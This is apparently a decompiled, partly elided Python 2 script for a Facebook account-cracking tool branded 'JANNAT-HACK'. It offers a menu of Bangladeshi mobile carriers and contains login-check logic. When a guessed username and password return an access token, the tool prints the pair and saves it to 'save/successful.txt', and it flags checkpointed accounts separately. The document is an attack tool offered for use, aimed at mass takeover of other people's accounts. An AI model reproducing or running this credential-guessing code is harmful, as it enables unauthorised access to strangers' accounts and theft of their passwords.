...
# Warning: this version of Python has problems handling the Python 3 byte type in constants properl
# Compiled at: 2022-01-24 15:21:23
...
logo = '\x1b[1;97m--------------------------------------------------\n      ---> Create to by -> Nazmul Hossain Rana   <--- \n\x1b[1;97m-------------------------------------------------- \n\x1b[1;97m     Facebook -> https://www.facebook.com/Assalamoalikom.Everyone \x1b[00m\n\x1b[1;97m--------------------------------------------------\n    ---> Github -> NON <--- \n\x1b[1;97m--------------------------------------------------'
...
def menu():
    ...
    print '\x1b[1;91mAUTHOR  : Jannnay '
    print '\x1b[1;91mFACEBOOK : Nazrul.Hossain.rana009'
    print '\x1b[1;91mGITHUB  : NON'
    print ''
    print 50* '-'
    print '\x1b[1;94m--------------------------------------------------'
    print
    ...
    print
    print '\x1b[1;92m[1]  ROBI (JANNAT PRO)'
    print '\x1b[1;92m[2]  AIRTEL(JANNAT)'
    print '\x1b[1;92m[3]  BANGLALINK(OLD)'
    print '\x1b[1;92m[4]  BANGLALINK(NEW)'
    print '\x1b[1;92m[5]  GRAMEEN(JANNAT)'
    print '\x1b[1;92m[6]  TELETALK(JANNAT)'
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[JANNAT-HACK]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;93m[JANNAT-CP]\x1b[1;97m ' + k + c + user + ' | ' + pass1 + '\x1b[1;93m[Login 10 Days]\x1b[0m \n'
